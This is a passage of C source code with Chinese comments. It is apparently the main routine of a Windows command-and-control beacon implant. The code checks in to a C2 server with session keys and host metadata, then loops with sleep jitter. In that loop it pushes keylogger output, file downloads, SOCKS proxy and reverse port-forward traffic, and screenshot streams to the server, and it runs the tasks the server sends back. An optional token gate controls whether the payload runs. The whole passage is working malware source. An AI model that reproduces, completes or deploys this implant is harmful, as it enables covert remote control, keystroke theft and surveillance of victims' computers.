     * 生成时不填口令, 槽位里就是空串, 这段直接跳过 ——
     * 于是同一个模板既能生成带门控的载荷, 也能生成不带的, 不必分两套模板。 */
    if (c2_gate_hash()[0] != '\0') {
        char gate_buf[1024];
        const char *env = getenv("CSDEV_TOKEN");
        if (env && cs_token_match(env)) {
            /* 环境变量命中 */
        } else {
            gate_buf[0] = '\0';
            GetCommandLineA_into(gate_buf, sizeof(gate_buf));
            if (!cs_token_scan(gate_buf)) {
                return 0;
            }
        }
    }

    g_tx  = (unsigned char *)VirtualAlloc(NULL, MAX_FRAME, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    g_rx  = (unsigned char *)VirtualAlloc(NULL, MAX_FRAME, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    g_pt  = (unsigned char *)VirtualAlloc(NULL, MAX_PLAIN, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    g_out = (unsigned char *)VirtualAlloc(NULL, MAX_PLAIN, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    g_scratch = (unsigned char *)VirtualAlloc(NULL, 512u * 1024u, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    g_xf_out  = (unsigned char *)VirtualAlloc(NULL, XF_BUF_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    g_xf_in   = (unsigned char *)VirtualAlloc(NULL, XF_BUF_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    g_wscratch = (unsigned char *)VirtualAlloc(NULL, 512u * 1024u, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    g_wxf_out  = (unsigned char *)VirtualAlloc(NULL, XF_BUF_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!g_tx || !g_rx || !g_pt || !g_out || !g_scratch || !g_xf_out || !g_xf_in ||
        !g_wscratch || !g_wxf_out) return 1;

    if (xform_chain_parse(&g_xf, C2_XFORM) != 0) g_xf.n = 0;   /* 解析失败则退回 raw */

    proxy_set_sink(proxy_sink);

#if C2_SLEEP_MASK
    smask_set_busy_hook(smask_busy);
#endif

    bmemset(&g_sess_state, 0, sizeof(g_sess_state));
    g_sess_state.sleep_ms = C2_SLEEP;
    g_sess_state.jitter   = (unsigned char)C2_JITTER;

    if (!csdev_make_session_keys(g_sess_state.aes_key, g_sess_state.hmac_key)) return 2;
    if (!c2_open()) return 3;

    /* 启动异步任务工作线程 (锁/事件/线程)。所有 box_* 都依赖 g_cs, 必须先初始化。 */
    InitializeCriticalSection(&g_cs);
    g_task_evt = CreateEventA(NULL, FALSE, FALSE, NULL);
    if (!g_task_evt) return 3;
    g_worker = CreateThread(NULL, 0, worker_proc, NULL, 0, NULL);
    if (!g_worker) { CloseHandle(g_task_evt); g_task_evt = NULL; return 3; }

    /* 采集元信息 */
    {
        unsigned int ml = build_meta(g_meta, 200);
        (void)ml;
        /* cwd 初始化为系统盘根 */
        g_meta[200] = 0;
        bstrcpy_n(g_meta + 200, "C:\\", 300);
    }

    /* ---- checkin ---- */
    flen = cs_frame_checkin(g_tx, MAX_FRAME, CSDEV_PUBKEY_BLOB, CSDEV_PUBKEY_LEN,
                            g_sess_state.aes_key, g_sess_state.hmac_key,
                            g_meta, bstrlen(g_meta));
    if (!flen) return 4;

    rlen = c2_post(g_tx, flen, g_rx, MAX_FRAME);
    if (rlen < CS_FRAME_HDR) { c2_close(); return 5; }

    g_sess_state.session_id = cs_be32(g_rx + 4);
    if (g_sess_state.session_id == 0) { c2_close(); return 6; }

    plen = cs_frame_open(&g_sess_state, g_rx, rlen, g_pt, MAX_PLAIN);
    if (plen < 0) { c2_close(); return 7; }

    {
        unsigned int count = cs_batch_count(g_pt, (unsigned int)plen), i;
        for (i = 0; i < count; i++) {
            cs_task t;
            if (!cs_batch_task(g_pt, (unsigned int)plen, i, &t)) break;
            if (task_is_async(t.cls)) taskq_push(&t);
            else run_task(&t, g_scratch);
        }
    }

    /* ---- 主循环 ---- */
    for (;;) {
        unsigned int up = 0, oblen = 0;

        beacon_sleep(g_sess_state.sleep_ms, g_sess_state.jitter);

        /* 推进未完成的传输与键盘记录增量, 再执行被延迟的传输任务 */
        pump_keylog();
        pump_download();
        pend_run();
        proxy_pump();          /* 推进 SOCKS 转发与 rportfwd 监听 */
        shotstream_pump();     /* 截图流: 取走最新一帧 */

        /* 组装上行明文: outbox 快照 + 心跳。
         * 锁内快照: 工作线程此刻可能正通过 box_result 往 outbox 追加结果。 */
        EnterCriticalSection(&g_cs);
        oblen = g_outlen;
        if (oblen > 0) bmemcpy(g_pt, g_out, oblen);
        LeaveCriticalSection(&g_cs);
        up = oblen;
        {
            unsigned char hb[8];
            unsigned long long now = (unsigned long long)GetTickCount64();
            cs_put_be32(hb, (unsigned int)(now / 1000ull));
            cs_put_be32(hb + 4, (unsigned int)(now & 0xFFFFFFFFull));
            up += cs_tlv_write(g_pt + up, MAX_PLAIN - up, T_HEARTBEAT, hb, 8);
        }

        flen = cs_frame_seal(&g_sess_state, F_HASRESULT, g_pt, up, g_tx, MAX_FRAME);
        if (!flen) { beacon_sleep(5000, 0); continue; }

        rlen = c2_post(g_tx, flen, g_rx, MAX_FRAME);
        if (rlen < CS_FRAME_HDR) {
            /* 网络失败: 保留 outbox 待下次重试 (上限保护) */
            if (g_outlen > MAX_PLAIN - 1024u) {
                EnterCriticalSection(&g_cs);
                g_outlen = 0;
                LeaveCriticalSection(&g_cs);
            }
            /* 连续失败达阈值即重连: 拆掉并重建会话句柄, 避免被一个楔死的连接
             * (半开 TCP / 挂起的代理) 拖垮后续每一轮请求。 */
            if (++fail >= 3) {
                c2_close();
                c2_open();
                fail = 0;
            }
            continue;
        }
        fail = 0;

        /* 发送成功: 消费掉已发送的 oblen 前缀, 保留工作线程在发送期间新追加的结果 */
        if (oblen > 0) {
            EnterCriticalSection(&g_cs);
            if (g_outlen > oblen) {
                bmemcpy(g_out, g_out + oblen, g_outlen - oblen);
                g_outlen -= oblen;
            } else {
                g_outlen = 0;
            }
            LeaveCriticalSection(&g_cs);
        }

        plen = cs_frame_open(&g_sess_state, g_rx, rlen, g_pt, MAX_PLAIN);
        if (plen <= 0) continue;

        {
            unsigned int count = cs_batch_count(g_pt, (unsigned int)plen), i;
            int want_exit = 0;
            for (i = 0; i < count; i++) {
                cs_task t;
                if (!cs_batch_task(g_pt, (unsigned int)plen, i, &t)) break;
                if (t.cls == CMD_EXIT) want_exit = 1;
                if (task_is_async(t.cls)) {
                    taskq_push(&t);           /* 长阻塞命令交工作线程, 主循环立即进入下一轮 */
                } else {
                    run_task(&t, g_scratch);
                }
            }
            if (want_exit) {
                /* 通知工作线程退出, 有界等待它把队列跑完, 再把结束回执发出去 */
                unsigned int x = 0;
                g_exiting = 1;
                SetEvent(g_task_evt);
                WaitForSingleObject(g_worker, 8000);
                EnterCriticalSection(&g_cs);
                if (g_outlen > 0) { bmemcpy(g_pt, g_out, g_outlen); x = g_outlen; }
                LeaveCriticalSection(&g_cs);
                flen = cs_frame_seal(&g_sess_state, F_HASRESULT, g_pt, x, g_tx, MAX_FRAME);
                if (flen) c2_post(g_tx, flen, g_rx, MAX_FRAME);
                c2_close();
                return 0;
            }
        }
    }
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d)
{
    (void)a; (void)b; (void)c; (void)d;
    return beacon_run();
}
